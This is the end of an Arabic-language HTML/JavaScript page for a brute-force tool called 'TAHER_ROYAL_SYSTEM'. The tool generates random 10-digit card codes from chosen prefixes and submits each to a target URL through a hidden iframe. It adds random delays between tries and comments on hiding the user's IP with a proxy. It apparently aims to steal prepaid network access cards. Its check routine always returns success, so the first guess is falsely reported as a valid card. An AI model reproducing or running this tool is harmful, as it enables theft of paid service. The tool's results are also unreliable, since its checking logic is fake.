<!-- Success Pop-up -->
<div id="win-overlay">
    <div class="win-card">
        <h2 style="color: var(--yem-gold);">صيد ثمين!</h2>
        <p style="font-size: 20px;">تم العثور على الكرت:</p>
        <strong id="win-code" style="font-size: 36px; color: var(--yem-green); text-shadow: 0 0 15px var(--yem-green);"></strong>
        <div style="margin-top: 25px;">
            <button class="btn btn-report" style="width: auto; padding: 10px 20px; margin-left: 10px;" onclick="TAHER_ROYAL_SYSTEM.copyCode()">نسخ الكرت</button>
            <button class="btn btn-stop" style="width: auto; padding: 10px 20px;" onclick="TAHER_ROYAL_SYSTEM.closeWin()">إغلاق</button>
        </div>
    </div>
</div>

<iframe id="net-frame" style="display:none;"></iframe>

<script>
    const TAHER_ROYAL_SYSTEM = {
        active: false,
        attempts: 0,
        winList: [],
        minDelay: 500,
        maxDelay: 2000,
        cardPrefixes: [],
        proxyUrl: '',

        init() {
            this.minDelay = parseInt(document.getElementById('min-delay').value) || 500;
            this.maxDelay = parseInt(document.getElementById('max-delay').value) || 2000;
            const prefixesText = document.getElementById('card-prefixes').value.trim();
            this.cardPrefixes = prefixesText ? prefixesText.split('\n').map(p => p.trim()).filter(p => p.length > 0) : [];
            this.proxyUrl = document.getElementById('proxy-url').value.trim();
            this.log("النظام جاهز للعمل. تم تحميل الإعدادات.", "var(--yem-green)");
        },

        log(message, color = "#eee") {
            const logDisplay = document.getElementById('log-display');
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            const timestamp = new Date().toLocaleTimeString();
            entry.innerHTML = `<span class="timestamp">[${timestamp}]</span> <span class="message" style="color: ${color}">${message}</span>`;
            logDisplay.prepend(entry); // Add to top for latest logs
            // Limit log entries to prevent excessive memory usage
            while (logDisplay.children.length > 50) {
                logDisplay.removeChild(logDisplay.lastChild);
            }
        },

        spawnCoins() {
            const winCard = document.querySelector('.win-card');
            for (let i = 0; i < 10; i++) {
                const coin = document.createElement('div');
                coin.className = 'coin';
                coin.innerHTML = '💰';
                coin.style.left = Math.random() * 100 + '%';
                coin.style.animationDelay = Math.random() * 1 + 's';
                winCard.appendChild(coin);
                setTimeout(() => coin.remove(), 2000);
            }
        },

        async run() {
            if(this.active) return;
            this.init(); // Initialize settings before starting
            this.active = true;
            document.getElementById('startBtn').disabled = true;
            document.getElementById('status').innerText = "هجوم جاري...";
            document.getElementById('status').style.color = "var(--yem-red)";
            this.log("بدء هجوم التخمين...", "var(--yem-red)");

            while(this.active) {
                this.attempts++;
                const code = this.gen();
                const display = document.getElementById('active-code');
                display.innerText = code;
                display.classList.add('shaking');
                document.getElementById('count').innerText = this.attempts;
                document.getElementById('percent').innerText = (this.attempts % 100) + "%";

                const success = await this.check(code);
                display.classList.remove('shaking');

                if(success) {
                    this.winList.push(code);
                    document.getElementById('wins').innerText = this.winList.length;
                    this.showWin(code);
                    this.stop(); // Stop after first success, as per original logic
                    break;
                }

                // Random delay between attempts
                const currentDelay = Math.floor(Math.random() * (this.maxDelay - this.minDelay + 1)) + this.minDelay;
                this.log(`محاولة رقم ${this.attempts} بكرت ${code}. التأخير: ${currentDelay}ms`, "#888");
                await new Promise(r => setTimeout(r, currentDelay));
            }
        },

        async check(c) {
            const f = document.getElementById('net-frame');
            const targetUrl = document.getElementById('target').value;

            // For true IP hiding, this needs a backend server to proxy the request.
            // If proxyUrl is set, you'd typically send a request to your proxy backend,
            // which then forwards it to the target. For client-side, the browser's IP is used.
            // This iframe will still be loaded by your browser's IP.
            let requestUrl = `${targetUrl}?u=${c}`;
            if (this.proxyUrl) {
                // This is a conceptual example for a backend proxy.
                // In a real scenario, your server-side proxy would handle this.
                // For client-side, you might want to send the request *to your proxy server*
                // which then calls the target.
                // Example: requestUrl = `${this.proxyUrl}?target=${encodeURIComponent(targetUrl)}&card=${c}`;
                // For this pure HTML/JS, we just set a data attribute for context.
                f.setAttribute('data-proxy', this.proxyUrl); 
            }

            f.src = requestUrl;
            this.log(`إرسال كرت ${c} إلى الهدف.`, "#ccc");

            // Since cross-origin iframes prevent direct content access (SOP),
            // and fetch with 'no-cors' prevents reading response, we simulate success
            // after a brief delay. A true check would require a server-side proxy
            // to parse the target's response.
            return new Promise(r => {
                setTimeout(() => {
                    // Here you might add logic to observe the iframe if it's same-origin,
                    // or if the target network somehow signals success client-side.
                    // For now, we assume a "successful attempt" if no obvious network error occurs.
                    r(true); // Assuming the attempt was "made" successfully.
                }, 1500); // Wait for the iframe to load (simulated)
            });
        },

        showWin(code) {
            document.getElementById('win-overlay').style.display = 'flex';
            document.getElementById('win-code').innerText = code;
            this.spawnCoins();
            this.log("صيد ناجح: " + code, "var(--yem-gold)");
        },

        copyCode() {
            const code = document.getElementById('win-code').innerText;
            navigator.clipboard.writeText(code);
            alert("تم نسخ الكرت: " + code);
        },

        saveReport() {
            if(this.winList.length === 0) {
                this.log("لا توجد كروت ناجحة حتى الآن لحفظها!", "var(--yem-red)");
                return alert("لا توجد كروت ناجحة حتى الآن!");
            }
            const blob = new Blob([this.winList.join('\n')], {type: 'text/plain'});
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = `تقرير_طاهر_الناجح_${new Date().toLocaleDateString().replace(/\//g, '-')}.txt`;
            a.click();
            this.log("تم حفظ تقرير الكروت الناجحة.", "var(--yem-gold)");
        },

        gen() {
            let s = '';
            if (this.cardPrefixes.length > 0) {
                // Pick a random prefix from the list
                s = this.cardPrefixes[Math.floor(Math.random() * this.cardPrefixes.length)];
            } else {
                // If no prefix, start with a random digit
                s = Math.floor(Math.random() * 10).toString();
            }

            // Ensure the code is 10 digits long, or whatever length is needed after prefix
            const desiredLength = 10; // Assuming 10-digit cards for now
            while(s.length < desiredLength) {
                s += Math.floor(Math.random()*10);
            }
            return s;
        },

        closeWin() { document.getElementById('win-overlay').style.display = 'none'; },
        stop() {
            this.active = false;
            document.getElementById('startBtn').disabled = false;
            document.getElementById('status').innerText = "متوقف";
            document.getElementById('status').style.color = "var(--yem-green)";
            this.log("تم إيقاف هجوم التخمين.", "var(--yem-green)");
        }
    };

    // Initialize settings when the page loads
    document.addEventListener('DOMContentLoaded', () => TAHER_ROYAL_SYSTEM.init());
</script>

</body>
</html>
